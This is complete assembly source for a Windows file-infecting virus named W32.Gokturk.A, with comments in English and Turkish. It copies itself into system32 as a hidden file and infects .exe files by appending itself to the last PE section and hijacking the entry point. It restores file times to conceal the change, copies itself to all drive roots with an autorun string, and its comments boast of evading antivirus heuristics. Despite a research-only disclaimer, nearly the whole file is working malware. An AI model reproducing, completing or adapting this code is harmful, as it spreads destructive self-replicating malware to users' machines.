.586
.model flat,stdcall
option casemap:none

;this code cannot be used for other subjects except virus and security researches! 
;written by IAC - infect and cure
;credits go to izee (for his very help), lord julus, billy belcebu and wargame
.code
vir_start:
	pushad
	pushfd
	
 	call delta
delta:	pop ebp
	sub ebp,offset delta ;now ebp points to delta label	

	mov eax,dword ptr [ebp + offset return_to_host + 3h]
	mov dword ptr [ebp + offset where_to_go],eax ; save host ip for exiting , it wil be changed during "infection" 

	mov eax,offset vir_end
	sub eax,offset vir_start
	mov dword ptr [ebp + offset vir_size],eax
	
	mov esi,dword ptr [esp + 24h] ; size of pushad pushfd -> esi points to return point of our prog in k32
	
	call get_kernel_image_base
		
	call find_main_apis
	
	call find_extra_apis

	;let start the job
	call infect	
	
	mov eax,offset GMK
	add eax,ebp
	push 0
	push eax
	push eax
	push 0
	call [ebp + AMessageBoxA]
	
		
jmp exit_ ;-> jump over functions and definitions	
;###############################FUNCTIONS and DEFINITIONS PART ##################################
;### DEFINITIONS ###
hello db "Rahat Uyu Üstad!!! Karanlık gecelerde yazdıkların",13,10,"bir gün bu vatanda yeni bir güneşi doğuracaktır!",13,10,"Tevfik FİKRET",0
GMK   db "Sevgili Kardeşim : Bu gün Türkiye için ne yaptın?",0
where_to_go dd 0
vir_size dd 0


;### /DEFINITIONS ###



;### FUNCTIONS ###
;----------------------------------------------------------------------------------------------------------------------
infect:
jmp infect_ ; just for var definition

exe_str db 0,0,0,0,0,0 ; i used NOD32 -> *.exe is enough for heuristics to think this file as viri!!
		       ; thats why we will dynamically fill it and voilaaa -> HEURISTICS becomes FUCKISTICS!!! I tested it
search_handle dd 0

MAX_PATH equ 260 ;taken from windows.inc ; thnx hutch :)

FILETIME struct ;taken from windows.inc
  dwLowDateTime     dword     0
  dwHighDateTime    dword     0
FILETIME ends

WIN32_FIND_DATA struct  ;taken from windows.inc
  dwFileAttributes      dword      0
  ftCreationTime        FILETIME <>
  ftLastAccessTime      FILETIME <>
  ftLastWriteTime       FILETIME <>
  nFileSizeHigh         dword      0
  nFileSizeLow          dword      0
  dwReserved0           dword      0
  dwReserved1           dword      0
  cFileName             byte MAX_PATH dup(0) ;offset 44d dont forget it!!!
  cAlternate            byte 14 dup(0)
WIN32_FIND_DATA ends    

find_data WIN32_FIND_DATA <>

current_directory byte MAX_PATH dup(0)
system_directory byte MAX_PATH dup(0)
module_name byte 100d dup(0)
system_directory_len dd 0
directory_count dd 0
upper_directory db "..",0
file_name_len dd 0
infect_:

	
	;fill exe_str
	mov word ptr [ebp + offset exe_str],'.*'
	mov word ptr [ebp + offset exe_str + 2],'xe'
	mov byte ptr [ebp + offset exe_str + 4],'e'
	
	;->>>>önce temizle çünkü önceki offspringler bu bufferları kulandı!
	mov eax,offset current_directory
	add eax,ebp ; temizlenecek bölümün başı!!!
	mov ecx,MAX_PATH
	add ecx,MAX_PATH
	add ecx,100d ;temizlenecek bölümün toplam boyutu!
	.while ecx > 0
	mov byte ptr [eax],0
	dec ecx
	inc eax
	.endw
;----------sistem dizini 
	push MAX_PATH
	mov eax,offset system_directory
	add eax,ebp
	push eax
	call [ebp + offset AGetSystemDirectoryA]
	mov dword ptr [ebp + offset system_directory_len],eax
;-------------

;------------halihazırdaki dizin  ->>>>önce temizle çünkü önceki offspringler bu bufferı kulandı!
	mov eax,offset current_directory
	add eax,ebp
	push eax
	push MAX_PATH
	call [ebp + offset AGetCurrentDirectoryA]
;-------------
	;kendimizi system32 klasörüne kopyalayalım!!! Haydi bakam:) başla!!!!
	push 0 ; NULL to get our self handle
	call [ebp + offset AGetModuleHandleA]
	mov ebx,eax
		
	push 100d
	mov eax,offset module_name
	add eax,ebp
	push eax
	push ebx
	call [ebp + offset AGetModuleFileNameA]
	mov ebx,eax ;how many chars are copied to buffer!?
	
	;-----------copy ourselves to system32 folder!!!

	;-----lets create the new file name!
	;system32 folder + our file name!
	mov eax,offset module_name
	add eax,ebp ; now eax points to our self names beginning
	add eax,ebx ; now eax points to our self names ENDING!!!
	xor ebx,ebx ;ismimizin uzunlugunu tutacak
	@@:
	dec eax
	inc ebx
	cmp byte ptr[eax],'\'
	je exit_slash_loop
	loop @B
	exit_slash_loop: ;şu anda eax \AAAAA.EXE 'ye işaret ediyor!
	mov dword ptr [ebp + offset file_name_len],ebx
	mov ebx,offset system_directory
	add ebx,ebp
	add ebx,dword ptr [ebp + offset system_directory_len] ; ebx points to system_directory strings ending!!!
	push esi;
	push edi;
	mov ecx,dword ptr [ebp + offset file_name_len]
	mov esi,eax
	mov edi,ebx
	rep movsb ;after this op,  system_directory variable will be our new file name to copy ourself
	pop edi;
	pop esi;
	
	push 0
	mov eax,offset system_directory
	add eax,ebp
	push eax
	mov eax,offset module_name ;our file name + path
	add eax,ebp
	push eax
	call [ebp + offset ACopyFileA] ;now we are in system32 folder:):) ha haaaaaaaaa
	
	;///////////////////////////////  ARMOUR OURSELF **********************************************
	mov eax,01h
	or eax,02h
	or eax,04h ;hidden system readonly! FUCK THE SYSTEM!
	push eax
	mov eax,offset system_directory ;lets hide our new file and ARMOR OUR NEW CHILD
	add eax,ebp
	push eax
	call [ebp + offset ASetFileAttributesA]
;--------------------------------------------
	xor ebx,ebx ;reset ebx for directory count	
	directory_loop:
		
	
	mov eax,offset find_data
	add eax,ebp
	push eax
	mov eax,offset exe_str
	add eax,ebp
	push eax
	call [ebp + offset AFindFirstFileA]
	mov dword ptr [ebp + offset search_handle],eax
	cmp eax,-1 ; INVALID_HANDLE_VALUE
	je exit_infection 
	
	;so we have a file_name in find_data
	call infect_file
	
	find_another:
		mov eax,offset find_data
		add eax,ebp
		push eax
		push dword ptr [ebp + offset search_handle]
		call [ebp + offset AFindNextFileA]
		cmp eax,0h
		je exit_infection
		
	call infect_file
	
	jmp find_another 
	
	exit_infection: ; burada eğer dosya bulunamadıysa dizin değiştirmemiz gerekiyor!
	
	mov ebx,dword ptr [ebp + offset directory_count]
	cmp ebx,03d
	ja exit_all
	
	mov eax,offset upper_directory
	add eax,ebp
	push eax
	call [ebp + offset ASetCurrentDirectoryA]
	mov ebx,dword ptr [ebp + offset directory_count]
	inc ebx
	mov dword ptr [ebp + offset directory_count],ebx
	jmp directory_loop
	
	exit_all:
	xor ebx,ebx
	mov dword ptr [ebp + offset directory_count],ebx ;reset counter coz if we dont, counter will be copied to the victim like its present value!!! NE APTALIM YA!!!
	ret
;----------------------------------------------------------------------------------------------------------------------
infect_file: ;heart of W32.Gokturk.A :):):):):)
jmp infect_file_ ; just for var definition

ex_file_attributes 		dd 0
ex_file_creation_time		FILETIME <>
ex_file_last_access_time 	FILETIME <>
ex_file_last_write_time		FILETIME <>
file_handle	  		dd 0
file_mapping			dd 0
map_of_file			dd 0
file_size 			dd 0
size_of_memory			dd 0
old_ip				dd 0
image_base			dd 0
file_align			dd 0
raw_data_size			dd 0
code_section 			dd 0
last_section			dd 0


infect_file_:
	;get file attributes
	mov eax,offset find_data
	add eax,ebp
	add eax,44d
	push eax
	call [ebp + offset AGetFileAttributesA]
	mov dword ptr [ebp + offset ex_file_attributes],eax
	cmp eax,0FFFFFFFFh
	je exit_infecting_a_file
	;continue infection
	
	;wipe attributes
	push 80h
	mov eax,offset find_data
	add eax,ebp
	add eax,44d
	push eax
	call [ebp + offset ASetFileAttributesA]
	cmp eax,0h
	je exit_infecting_a_file
	;-------------------------------------- file is wiped -----------------------------
	;lets open it
	push 0                                 
     	push 0                                 
     	push 3                                 
      	push 0                                 
      	push 1                                 
      	push 80000000h or 40000000h            
	mov eax,offset find_data
	add eax,ebp
	add eax,44d
	push eax     	                              
      	call [ebp+offset ACreateFileA]
	mov dword ptr [ebp + offset file_handle],eax
	cmp eax,-1
	je exit_infecting_a_file
	
	;get c,e,d times
	mov eax,offset ex_file_last_write_time
	add eax,ebp
	push eax
	mov eax,offset ex_file_last_access_time
	add eax,ebp
	push eax
	mov eax,offset ex_file_creation_time
	add eax,ebp
	push eax
	mov eax,offset file_handle
	add eax,ebp
	push eax
	call [ebp + offset AGetFileTime]
	
	;map file for fetching file alignment
	push 0                                 
      	push 0
      	push 0                                 
      	push 4                                 
      	push 0                                 
      	push dword ptr [ebp + offset file_handle]
      	call [ebp + offset ACreateFileMappingA]
	mov dword ptr [ebp + offset file_mapping], eax
      	cmp eax, 0                             
      	je exit_infecting_a_file                  
		
	;get file size
	push 0                                
      	push dword ptr [ebp + offset file_handle] 
      	call [ebp + offset AGetFileSize]           
      	mov dword ptr [ebp + offset file_size],eax
      	cmp eax,0
      	je exit_infecting_a_file
        
        ;map file into memory	- 1st time we ll close it in a second!
	push 0
     	push 0                                 
      	push 0                                 
      	push 2                                 
      	push dword ptr [ebp + offset file_mapping]                               
      	call [ebp + offset AMapViewOfFile]  
      	mov dword ptr [ebp + offset map_of_file],eax
      	cmp eax,0
      	je exit_infecting_a_file
      	mov esi,dword ptr [ebp + offset map_of_file] ;esi points to memory of the mapped file
        
        ;get file align
        mov eax,esi
        add eax,03ch
	add esi,dword ptr [eax]
	mov eax,dword ptr [eax] ; file alignment
	mov ebx,dword ptr [ebp + offset file_size]
	add ebx,dword ptr [ebp + offset vir_size]
	add ebx,1000h ;extra space
	
	;align it!
	mov esi,0
	xor edx,edx
	@@: add edx,eax ; add file alignment
		cmp edx,ebx ; aligned size <? total size
		jb @B
	;now store aligned value for mapping	
	mov dword ptr [ebp + offset size_of_memory],edx
	
	push dword ptr [ebp + offset map_of_file]
	call [ebp + offset AUnmapViewOfFile]
	
	push dword ptr [ebp + offset file_mapping] 
	call [ebp + offset ACloseHandle]
	
	
	;create file mapping again
	push 0                                 
      	push dword ptr [ebp + offset size_of_memory] ;file size +  vir size + 1000h extra space + padded bytes
      	push 0                                 
      	push 4                                 
      	push 0                                 
      	push dword ptr [ebp + offset file_handle]
      	call [ebp + offset ACreateFileMappingA]
	mov dword ptr [ebp + offset file_mapping], eax
      	cmp eax, 0                             
      	je exit_infecting_a_file                  
		
	;map file into memory	
	push dword ptr [ebp + offset size_of_memory]     
     	push 0                                 
      	push 0                                 
      	push 2                                 
      	push dword ptr [ebp + offset file_mapping]                               
      	call [ebp + offset AMapViewOfFile]  
      	mov dword ptr [ebp + offset map_of_file],eax
      	cmp eax,0
      	je exit_infecting_a_file
      	mov esi,dword ptr [ebp + offset map_of_file] ;esi points to memory of the mapped file

	mov ax,'ZM'
	cmp word ptr [esi],ax ;FUCK AV HEURISTICS!!! 
	jne exit_infecting_a_file
	
	mov eax,esi
	add eax,30h
	add eax,8h
	cmp word ptr [eax],'90' ;test if already infected
	jne continue
	jmp exit_infecting_a_file
	continue:
	mov word ptr [eax],'90' ; mark file
	
	add esi,dword ptr [esi + 3Ch] ;esi = PE header
	mov ax,'EP'
	cmp word ptr [esi],ax ;FUCK AV HEURISTICS!!! 
	jne exit_infecting_a_file
	
	mov eax, dword ptr [esi + 40d] ; get old entry point
	mov dword ptr [ebp + offset old_ip],eax
	mov ebx, dword ptr [esi + 52d]; image base
	mov dword ptr [ebp + offset image_base],ebx
	add eax,ebx ; VA of the 
	mov dword ptr [ebp + offset return_to_host + 3h],eax ;lets set where will we go after the orgasm! :):):) 
							     ;behave as if nothing happened:):) I didnt do it :) ok,enough:)
						             ;watch out : return to host dword will change during infection
						             ;thats why every copy of viri first stores that dword after
						             ;delta handle , and again restores it before exit!
		
	mov eax,dword ptr [esi + 3ch] ;file_align of victim
	mov dword ptr [ebp + offset file_align],eax
		
	movzx eax,word ptr [esi + 6h] ;num of sections
	dec eax ;last section for multiplying...
	mov edx,20h ;ask me : why adding 28 at one hand? answer: i tested it with NOD32 Heuristics,it fails if you do it 
		    ;like this... : don't believe it? TRY IT YOURSELF!!! also Kaspersky :) 1 minute before installed it!
		    ;FUCK AV HEURISTICS!!! 
	add edx,8h
	mul edx ; eax = offset of last sections beginning from the beginning of section table
	
		
	movzx ebx,word ptr [esi + 20d] ;size of optional header
	;Pe header offset + 22 (IMAGE_FILE_HEADER) + size of optional header + (num of sections-- ) * 28h(size of a section header) = 
	;=last sections beginning
	push esi ;store it for future : actually for 10 or more lines later:)
	
	mov ecx,esi
	add ecx,20d
	add ecx,4d ;FUCK AV HEURISTICS!!!
	add ecx,ebx
	add ecx,eax 
	mov esi,ecx ;now esi points to last sections beginning!!! section_header
	mov dword ptr [ebp + offset last_section],esi
	mov ebx,esi
	sub ebx,eax ; offset of the first sections begining in the section table
	mov dword ptr [ebp + offset code_section],ebx
	
	mov eax,esi 
	add eax,20h
	add eax,4h ;FUCK AV HEURISTICS!!!
	or dword ptr [eax],0A0000020h ;r w e access
	
	
	mov ebx,dword ptr [esi + 10h] ; SizeOfRawData of section
	mov dword ptr [ebp + offset raw_data_size],ebx
	mov eax,dword ptr [esi + 14h] ;PointerToRawData  of section (file offset from the beginning)
	add eax,ebx ; file offset of the last sections end! but must be added to victim_memory
	add eax,dword ptr [ebp + offset map_of_file] ; its the memory offset of the file where we will write our code! :):):)
							; coming to the end dude! ;) just wait a minute!
	mov edi,eax ; store it for using rep movsb
	
	
        mov eax,dword ptr [ebp + offset file_align]
        mov ebx,dword ptr [ebp + offset raw_data_size]
	add ebx,dword ptr [ebp + offset vir_size]  ; EBX = last section's Size of raw data + VirusSize	
	xor edx,edx
		@@: 
		add edx,eax ; multiply it!
		cmp edx,ebx
		jbe @B
		mov eax,esi
		add eax,10h;FUCK AV HEURISTICS!!! esi + 10h
		mov dword ptr [eax],edx ; new size of raw data aligned to file alignment
		sub eax,08h;FUCK AV HEURISTICS!!! = esi + 08h
        	mov dword ptr [eax],edx ; new Virtual size
	add eax,08h
	mov     eax,dword ptr [eax]                   ; EAX = New SizeOfRawData
	mov ecx,esi 
	add ecx,0Ch;FUCK AV HEURISTICS!!! = esi + 0Ch
        add     eax,dword ptr [ecx]                   ; EAX = EAX+VirtualAddress
	
	
	;-------CHANGE EIP OF THE VICTIM FILE TO VIRI'S EIP------------------------------ ecx = our virus's RVA!!!
	mov ecx,dword ptr [esi + 12d] ; RVA of the last section
	add ecx,dword ptr [ebp + offset raw_data_size] ; so it changed to our virus's RVA :)
	pop esi
	mov eax,esi
	add eax,20h
	add eax,8h
	mov dword ptr [eax] , ecx ;change victims EIP to our viri RVA!!!
	;sliding technique!!! my very first technique!
	
	
	
	;--------------------------------------------------------------------------------
	mov ecx,dword ptr [ebp + offset raw_data_size]
	sub edx,ecx
	mov ebx,dword ptr [esi + 56d] ; section alignment
	mov eax,dword ptr [esi+50h]   ;size of image
	add eax,edx ; sizeofimage + aligned size
	xor ecx,ecx
	@@:
		add ecx,ebx
		cmp ecx,eax
		jb @B
		mov dword ptr [esi+50h],ecx ; new size of image
	
	mov esi,offset vir_start
	add esi,ebp
	mov ecx,dword ptr [ebp + offset vir_size]
	rep movsb
		
	push 0
	mov eax,offset hello
	add eax,ebp
	push eax
	push eax
	push 0
	call [ebp + offset AMessageBoxA]
	
exit_infecting_a_file:
	;restore times
	mov eax,offset ex_file_last_write_time
	add eax,ebp
	push eax
	mov eax,offset ex_file_last_access_time
	add eax,ebp
	push eax
	mov eax,offset ex_file_creation_time
	add eax,ebp
	push eax
	mov eax,offset file_handle
	add eax,ebp
	push eax
	call [ebp + offset ASetFileTime]
	
	;restore file attributes
	mov eax,dword ptr [ebp + offset ex_file_attributes]
	push eax
	mov eax,offset find_data
	add eax,ebp
	add eax,44d
	push eax
	call [ebp + offset ASetFileAttributesA]
	cmp eax,0h
	je bye_
	
	;close file and unmap
	cmp dword ptr [ebp + offset file_handle],-1
	je bye_	
	push dword ptr [ebp + offset file_handle]
	call [ebp + offset ACloseHandle]
	
	cmp dword ptr [ebp + offset map_of_file],0h
	je bye_
	push dword ptr [ebp + offset map_of_file]
	call [ebp + offset AUnmapViewOfFile]

bye_:
ret
;----------------------------------------------------------------------------------------------------------------------
find_extra_apis:
jmp load_ ; just for var definition

user32 db "user32.dll",0
SMessageBoxA  db "MessageBoxA",0
AMessageBoxA  dd 0

load_:
	mov eax,offset user32
	add eax,ebp
	push eax
	call [ebp + offset AGetModuleHandleA]
	cmp eax,0h
	jne load_message_box ; used it in case the victim doesnt loaded user32.dll
			     ; in that case we will have to load user32.dll to memory
	
	mov eax,offset user32
	add eax,ebp
	push eax
	call [ebp + offset ALoadLibraryA]
	cmp eax,0
	je exit_
	
	
	load_message_box:
	mov ebx,offset SMessageBoxA
	add ebx,ebp
	push ebx
	push eax ; user32.dll
	call [ebp + offset AGetProcAddress]
	cmp eax,0h
	je exit_
	
	mov dword ptr [ebp + offset AMessageBoxA],eax
		
	ret
;----------------------------------------------------------------------------------------------------------------------
get_kernel_image_base:  ;assumes esi -> a memory point between the address space of kernel
			;returns kernel_base_address in eax if kernel is found, else eax=0 -> not found
mov ecx,esi ; kernel address
jmp start_getting ; just for var definition

k32 dd 0


start_getting:
cmp dword ptr [esi],'NREK' ; i dumped it , its written like this : win xp sp2

je found_kernel_str
dec esi
loop start_getting
mov eax,0
ret

	found_kernel_str:
	cmp word ptr [esi],'ZM'
 	je return_
 	dec esi
	loop found_kernel_str	
	mov eax,0
	ret

		return_:					
		mov dword ptr [ebp + offset k32],esi
		cmp esi,0
		je exit_
		
		ret
;----------------------------------------------------------------------------------------------------------------------
find_main_apis:   ;assumes esi = imagebase of Kernel32
 
jmp get_kernel_pe_header ; just for var definition

k32_export_table dd 0 ;VA
k32_name_table	 dd 0 ;VA
k32_name_counter dd 0

next_api_string   	dd 0
current_api_string 	dd 0
str_size 	  	dd 0
api_address_counter   	dd 0


api_strings:
SExitProcess		db   "ExitProcess",0

SGetProcAddress 	db   "GetProcAddress",0
SGetModuleHandleA	db   "GetModuleHandleA",0
SGetModuleFileNameA	db   "GetModuleFileNameA",0
SLoadLibraryA		db   "LoadLibraryA",0

SGetWindowsDirectoryA	db   "GetWindowsDirectoryA",0
SGetSystemDirectoryA	db   "GetSystemDirectoryA",0
SGetCurrentDirectoryA	db   "GetCurrentDirectoryA",0
SSetCurrentDirectoryA	db   "SetCurrentDirectoryA",0

SCreateFileA 		db   "CreateFileA",0
SCopyFileA			db 	 "CopyFileA",0
SCloseHandle		db   "CloseHandle",0
SCreateFileMappingA	db   "CreateFileMappingA",0
SMapViewOfFile		db   "MapViewOfFile",0
SUnmapViewOfFile	db   "UnmapViewOfFile",0
SFindFirstFileA		db   "FindFirstFileA",0
SFindNextFileA		db   "FindNextFileA",0

SSetFileAttributesA	db   "SetFileAttributesA",0
SGetFileAttributesA	db   "GetFileAttributesA",0
SGetFileTime		db   "GetFileTime",0
SSetFileTime		db   "SetFileTime",0
SGetFileSize		db   "GetFileSize",0

SSleep			db   "Sleep",0

SCreateMutexA	db  "CreateMutexA",0
SOpenMutexA		db 	"OpenMutexA",0

SGetLogicalDriveStringsA	db "GetLogicalDriveStringsA",0
SGetLogicalDrives	db "GetLogicalDrives",0
SGetDriveTypeA 		db "GetDriveTypeA",0


dd 00000090h ;not a sign simply NOP :) why? dont leave any sign for heuristics:) again heuristics? YES! ALWAYS...

api_addresses:
AExitProcess 		dd 0	

AGetProcAddress		dd 0
AGetModuleHandleA	dd 0
AGetModuleFileNameA	dd 0
ALoadLibraryA		dd 0

AGetWindowsDirectoryA	dd 0
AGetSystemDirectoryA	dd 0
AGetCurrentDirectoryA	dd 0
ASetCurrentDirectoryA	dd 0

ACreateFileA		dd 0
ACopyFileA			dd 0
ACloseHandle		dd 0
ACreateFileMappingA	dd 0
AMapViewOfFile		dd 0
AUnmapViewOfFile	dd 0
AFindFirstFileA		dd 0
AFindNextFileA		dd 0

ASetFileAttributesA	dd 0
AGetFileAttributesA	dd 0
AGetFileTime		dd 0
ASetFileTime		dd 0
AGetFileSize		dd 0

ASleep			dd 0

ACreateMutexA	dd 0
AOpenMutexA	dd 0

AGetLogicalDriveStringsA	dd 0
AGetLogicalDrives	dd 0
AGetDriveTypeA		dd 0


	get_kernel_pe_header:
	mov esi,dword ptr [ebp + offset k32]
	add esi,dword ptr [esi + 3Ch] ; PE header VA
	
	mov esi,dword ptr [esi + 78h] ; export table RVA
	add esi,dword ptr [ebp + offset k32] ;VA
	mov dword ptr [ebp + offset k32_export_table],esi
	
	add esi,32d ; address of names RVA in export table
	mov esi,dword ptr [esi]
	add esi, dword ptr [ebp + offset k32] ; starting of dword array of function names in k32
	mov dword ptr [ebp + offset k32_name_table],esi
	
	;start next_api_string
	mov dword ptr [ebp + offset next_api_string],offset api_strings
	add dword ptr [ebp + offset next_api_string],ebp
	
	
	api_loop:
	mov esi,dword ptr [ebp + offset next_api_string]
			cmp dword ptr [esi],00000090h
			je all_found
	;get a string from api_strings label
	mov dword ptr [ebp + offset k32_name_counter],0h ;reset name counter
	mov esi,dword ptr [ebp + offset next_api_string]
	xor ecx,ecx
	mov dword ptr [ebp + offset current_api_string],esi
	@@: cmp byte ptr [esi],0h
	 	je @F
	 	inc ecx
	 	inc esi
	 	jmp @B
	 @@:	
	 	mov dword ptr [ebp + offset str_size],ecx
	 	inc esi
	 	mov dword ptr [ebp + offset next_api_string],esi ; next str
		
	get_name_from_k32:
	;get a name and normalize it
	mov eax,dword ptr [ebp + offset k32_name_counter]
	mov ebx,4h
	mul ebx
	add eax,dword ptr [ebp + offset k32_name_table]
	mov eax,dword ptr [eax]
	add eax,dword ptr [ebp + offset k32] ; now we have an api name
	add dword ptr [ebp + offset k32_name_counter],1h ;  increment for next
	
	compare_two_names:
		mov ecx,dword ptr [ebp + offset str_size]
		mov edi,eax ; api name in k32 name table
		mov esi,dword ptr [ebp + offset current_api_string]
		@@:cmpsb
			jne @F
			loop @B
			;we have found it so calculate ordinal
			jmp calc_ordinal
		@@: ;not the same api
		jmp get_name_from_k32
		
	calc_ordinal:
		sub dword ptr [ebp + offset k32_name_counter],1h ; current names ordinal pos
		mov ebx,2
		mov eax,dword ptr [ebp + offset k32_name_counter]
		mul ebx
		
		mov esi,dword ptr [ebp + offset k32_export_table]
		add esi,36d
		mov esi,dword ptr [esi]
		add esi,dword ptr [ebp + offset k32] ; ordinal table
		add esi,eax ; ordinal of our api
		
		movzx eax,word ptr [esi] ; ordinal of our api
		
		mov esi,dword ptr [ebp + offset k32_export_table]
		add esi,28d
		mov esi,dword ptr [esi]
		add esi,dword ptr [ebp + offset k32] ; address table
		
		mov ebx,4h
		mul ebx
		add esi,eax
		mov esi,dword ptr [esi]
		add esi,dword ptr [ebp + offset k32]
				
		
		mov eax,dword ptr [ebp + offset api_address_counter]		
		mov dword ptr [ebp + offset api_addresses + eax],esi
		add dword ptr [ebp + offset api_address_counter],4h
			
			
			jmp api_loop
			
	all_found:
	mov dword ptr [ebp + offset api_address_counter],0 ;fuck u fucking counter!!! i have been working to solve this 
	;shit problem since 10 PM and its 04:02 AM now!!! So my dear reader, be urself and dont forget to 
	;reset everthing before writing ur viri to a new file!!! Example, think if we didnt reset it,so 
	;we wrote ourself to a victim, what happens? counter is at the end! so it will try to write beyond the 
	;api address boundaries!!! yaaaa:):):)
	
	ret
	
;----------------------------------------------------------------------------------------------------------------------
;### /FUNCTIONS ###




exit_:
jmp exit__
 	;---------------------------------------INF LOOP FOR MUTEX-----------------------------------------------------
	;bu bölüme ister ana programa dönüş, istersek de bir while döngüsü koyabiliriz!!! Fakat 
	;şüphe çekmemek için buraya konacak bir MUTEX ile programın en az bir kopyasının çalışmasını sağlayabiliriz!!!
	;
	mutex_name db "AnthraxA",0
	drive_list byte 50d dup(0)
	drive_list_counter dd 0
	a_drv db "A:",0
	b_drv db "B:",0
	c_drv db "C:",0
	d_drv db "D:",0
	e_drv db "E:",0
	f_drv db "F:",0
	g_drv db "G:",0
	h_drv db "H:",0
	i_drv db "I:",0
	j_drv db "J:",0
	our_name byte 150d dup(0)
	new_file db 0,0,0,"sis.exe",0
	
	auto_run db "[autorun]",13,10,"shellexecute=sis.exe",0
	auto_fname db "autorun.inf",0
		
	exit__:
	;lets open the mutex
		mov eax,offset mutex_name
		add eax,ebp
		push eax
		push 1
		push 1F0001h
		call [ebp + offset AOpenMutexA]
		cmp eax,0
		jne break_infite   ;-----------------> If a mutex called Anthrax exists, then our prog will run! Else, it will
		;enter into an infinite loop! Böylece farklı isimdeki şüpheli dosyaları engellediğimiz gibi mutlaka bir örneğin de 
		;çalışmasını sağlamış olacağız!!!
		;lets create the mutex
		mov eax,offset mutex_name
		add eax,ebp
		push eax
		push 1
		push 0
		call [ebp + offset ACreateMutexA]
		;--------------
		
				
	infinite_loop:
		mov eax,offset drive_list
		add eax,ebp
		push eax
		push 50d
		call [ebp + offset AGetLogicalDriveStringsA]
		
		xor ecx,ecx
		
		.while ecx < 50d
		mov ecx,dword ptr [ebp + offset drive_list_counter]
		mov ebx,offset drive_list
		add ebx,ebp
		add ebx,ecx
		push ebx
		call [ebp + offset AGetDriveTypeA]
		;drive type ı aldık!!!! şimdi kopyalayabiliriz!!!!
		cmp eax,0
		je go_on__ ;we can start copying ourself!!!
		mov ecx,dword ptr [ebp + offset drive_list_counter]
		mov ebx,offset drive_list
		add ebx,ebp
		add ebx,ecx ;şu anda ebx harddisk'in adını tutuyor!!!
		mov ecx,3d
		mov esi,ebx
		mov edi,offset new_file
		add edi,ebp
		rep movsb	;now we have a name:) in new file name
		
	push 0
	mov eax,offset new_file
	add eax,ebp
	push eax
	mov eax,offset system_directory ;our file name + path
	add eax,ebp
	push eax
	call [ebp + offset ACopyFileA] ;now we are in system32 the flash disk root folder:):) ha haaaaaaaaa
		
		go_on__: ;drive couldnt find!!!
		mov ecx,dword ptr [ebp + offset drive_list_counter]
		add ecx,4d
		mov dword ptr [ebp + offset drive_list_counter],ecx
		.endw
		mov dword ptr [ebp + offset drive_list_counter],0h
		
		
		
		
		
	jmp infinite_loop
	;-------------------------------------------------------------------------------------------------------------

	break_infite:
		mov eax,dword ptr [ebp + offset where_to_go]
		mov dword ptr [ebp + offset return_to_host + 3h],eax ; popad + popfd + 68h  = 3 bytes
				
		cmp ebp,0h
		jne return_to_host
			
			push 0
			call [ebp + offset AExitProcess]
	
return_to_host:

	popfd
	popad
	db 68h,0,0,0,0
	ret

vir_end:
end vir_start

